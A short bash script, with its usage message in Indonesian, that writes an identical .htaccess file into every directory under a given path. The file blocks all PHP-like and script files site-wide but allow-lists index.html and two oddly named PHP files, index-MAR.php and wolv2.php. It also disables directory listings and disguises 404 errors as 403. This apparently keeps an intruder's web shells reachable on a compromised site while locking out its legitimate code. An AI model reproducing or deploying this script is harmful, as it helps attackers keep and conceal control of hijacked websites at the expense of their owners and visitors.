#!/bin/bash

if [ -z "$1" ]; then
  echo "Penggunaan: bash ht.sh /path/to/directory"
  exit 1
fi

TARGET_DIR="$1"
create_htaccess_content() {
cat <<EOL
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>

<FilesMatch "\.(jpg|pdf|docx|jpeg|)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>

<FilesMatch "^(index.html|index-MAR.php|wolv2.php|)$">
    Order allow,deny
    Allow from all
</FilesMatch>

DirectoryIndex index.html

Options -Indexes
ErrorDocument 403 "403 Forbidden"
ErrorDocument 404 "403 Forbidden"
EOL
}

create_htaccess() {
    create_htaccess_content > "$1/.htaccess"
}

export -f create_htaccess
export -f create_htaccess_content

find "$TARGET_DIR" -type d -exec bash -c 'create_htaccess "$0"' {} \;

